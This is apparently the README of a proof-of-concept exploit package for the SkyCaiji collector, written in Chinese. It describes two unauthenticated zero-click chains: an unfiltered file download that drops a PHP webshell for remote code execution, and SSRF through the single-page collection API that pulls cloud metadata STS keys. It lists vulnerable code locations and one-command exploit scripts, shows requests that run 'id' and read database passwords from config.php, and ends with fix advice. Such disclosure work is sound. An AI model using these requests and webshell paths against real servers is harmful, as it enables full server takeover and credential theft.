# PoC：SkyCaiji 未认证 0-click 漏洞（两条链，同一入口）

> 仅用于授权范围内的安全研究 / 复现验证。请勿用于未授权系统。

本目录含两个未认证 0-click PoC，共用同一入口（未认证单页采集 `admin/api/single`），区别在后置流水线：

| 脚本 | 链 | 影响 |
|---|---|---|
| **`run-rce.sh`** | **V4** 未认证 → 文件本地化任意 `.php` 落盘 → webshell → **RCE → 永久凭据** | 持久化，服务器完全控制 + 永久 DB/云/邮箱密钥 |
| `run.sh` | V1 未认证 → SSRF → 云元数据 → **临时** STS AK/SK | 短效 STS 凭据 |

```bash
docker compose up -d --build
bash run-rce.sh   # V4（推荐；持久化 RCE）
bash run.sh       # V1（临时 STS）
```

---

## V4：未认证 → 文件本地化 → webshell → RCE → 永久凭据（run-rce.sh）

### 一句话
单页采集抓取攻击者页面后，其"文件本地化"(download_file) 会把攻击者 HTTP 响应体**无扩展名过滤**地写成 `data/files/<date>/<md5(url)>.php`；该目录无 `.htaccess` 保护、根重写对已存在文件直接交 Apache 执行 → 未认证持久化 webshell/RCE。

### 关键代码
- 入口/放行：同 V1（`route.php`、`admin/behavior/Init.php:95`、`admin/controller/BaseController.php:20`、`admin/controller/Api.php:67`）
- 攻击者 URL：`admin/event/CpatternSingle.php:19`
- 裸文件 URL 提取(is_file)：`admin/event/CollectCommon.php:2002-2011,2084`
- 下载落盘(**无扩展名白名单**)：`admin/event/ReleaseBase.php:154-182,688-690,712,747,782` → `app/common.php:107` `write_dir_file`
- 后缀取法无过滤：`admin/extend/util/Funcs.php:474`
- 可执行：`data/files/` 无 `.htaccess`（对比 `data/program/.htaccess=deny from all`）；根 `.htaccess` `!-f` 使已存在 `.php` 直接执行

### 前置条件（运营者配置，`run-rce.sh` 的 seed-rce.sql 已模拟）
pattern 单页任务(single.open=1, key='') + 开启文件本地化 download_file + 字段含 download/is_file 处理步 + 配置了非 api 发布模块(此处用 datahub)。

### 预期输出（节选）
```
GET /index.php/api_single/1?url=http://metadata.internal/p          # 未认证，落 webshell
GET /data/files/2026-10-07/711d03aae2b9484044705730ea25be62.php?c=id # 未认证，执行
  -> SKYCAIJI-RCE-PWNED:uid=33(www-data) gid=33(www-data) ...
GET .../711d03...php?c=cat /var/www/html/data/config.php            # 读永久DB账密
  -> 'DB_USER' => 'root','DB_PWD' => 'root123', ...
```
webshell 路径 = `data/files/<服务器日期>/<md5(文件URL)>.php`，完全可预测。

### 修复
文件本地化强制扩展名白名单(拒 php/phtml/asp/jsp 及无扩展名按远端命名)+按 MIME 校验；`data/`(尤其 `data/files`、`data/images`)加 `deny from all`/Nginx 等效；下载 URL 纳入 SSRF 防护。

---

## V1：未认证 0-click SSRF → 云元数据 → 临时 AK/SK 泄漏（run.sh）

## 漏洞一句话
`admin/api/single`（单页采集接口）**无需登录**即可到达，其抓取目标 URL 完全来自请求参数 `url`。
服务端用 curl 去抓取该 URL（**无 host / IP / 协议白名单，且跟随 302**），并把响应体原样回显给调用者。
攻击者据此让服务器去访问本机云元数据服务（阿里云 `100.100.100.200` / AWS `169.254.169.254`），
取回 **RAM/STS 临时凭证（AccessKeyId / AccessKeySecret / SecurityToken）**。

- 认证：**无**（不带任何 Cookie；GET 不校验 usertoken；admin 鉴权钩子对 `api` 控制器放行）。
- 交互：**0-click**（单个 GET 请求）。
- 前置条件：目标存在一个 `module=pattern` 且 `single.open=1` 的任务；当 `single.key` 为空时**完全无需密钥**
  （“单页采集”本就是设计给外部系统调用的接口，空密钥是常见部署）。

## 关键代码路径
- 路由 `api_single/:id/[:key]` → `admin/api/single`  —— `app/route.php`
- 鉴权放行：`app/admin/behavior/Init.php:95`（非管理员仅拒绝 `index`/`api` 之外的控制器）
  + `app/admin/controller/BaseController.php:20`（`api` 控制器跳过 usertoken）
- 入口：`app/admin/controller/Api.php:67` `singleAction`
- 取攻击者 URL：`app/admin/event/CpatternSingle.php:19` `$curUrl=input('url')`
- 抓取 sink：`app/admin/event/CpatternColl.php:1575` `get_page_html` → `app/common.php:217` `get_html` → `app/extend/util/Curl.php`
- 整页回显：`app/admin/event/CollectCommon.php:2663` `dvalue` 模块 `$val=$html`
（以上 `app/` 实为 `vendor/skycaiji/app/`）

## 一键复现
需要：Docker + docker compose。

```bash
cd security-poc
docker compose up -d --build          # 启动 app(SkyCaiji) / db(mysql) / meta(伪云元数据)
bash run.sh                           # 自动安装→植入受害者配置→发起未认证攻击并打印泄漏的 AK/SK
```

`meta` 容器（别名 `metadata.internal`）模拟只有服务端能访问的云元数据服务，返回伪造的 STS 临时凭证。

## 预期输出（节选）
```
GET http://127.0.0.1:8899/index.php/api_single/1?url=http://metadata.internal/latest/meta-data/ram/security-credentials/myrole
{"code":1,"msg":"","data":[{"content":{"name":"content","value":"{\"AccessKeyId\":\"EXAMPLE-STS-ACCESS-KEY-ID-PLACEHOLDER\",\"AccessKeySecret\":\"EXAMPLE-STS-ACCESS-KEY-SECRET-PLACEHOLDER\",\"SecurityToken\":\"EXAMPLE-STS-SESSION-TOKEN-PLACEHOLDER\"}",...}}]}
```
`data[0].content.value` 内即为服务端从元数据服务取回、原样回显给**未认证攻击者**的临时 AK/SK。

## 单独发包
```bash
BASE="http://TARGET:PORT/index.php" ./exploit.sh 1 "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

## 说明与边界
- `file://` 本地文件读经此路径**不可用**：`get_html` 以 HTTP 200 判定成功，`file://` 的 http_code=0 → 返回空。HTTP/HTTPS SSRF 完全可用。
- 内容回显依赖任务字段类型：`dvalue` / 宽泛 `regex` / `//*` xpath → 回显整页；站点专用窄规则 → 退化为**盲 SSRF**（仍可内网探测 / 打内网 API）。
- 设了 `single.key` 时需在 URL 带 `md5(single.key)`；该 key 随 URL 传输，易经日志 / Referer 泄漏。

## 修复建议
1. 单页采集接口强制密钥校验，且改为**时间戳签名**（避免 key 明文随 URL 传输、可重放）。
2. `get_html` / `\util\Curl` 增加 SSRF 防护：禁用非 http(s) 协议、拒绝内网/保留网段（含重定向后的目标）、禁止跟随到内网的 302。
3. 单页采集的目标 URL 应校验是否属于任务允许的域；或对接口做鉴权与来源限制。
4. 清理：`admin/api`、`admin/index` 的免登录放行应收敛为“仅登录/验证码等必要动作”白名单。
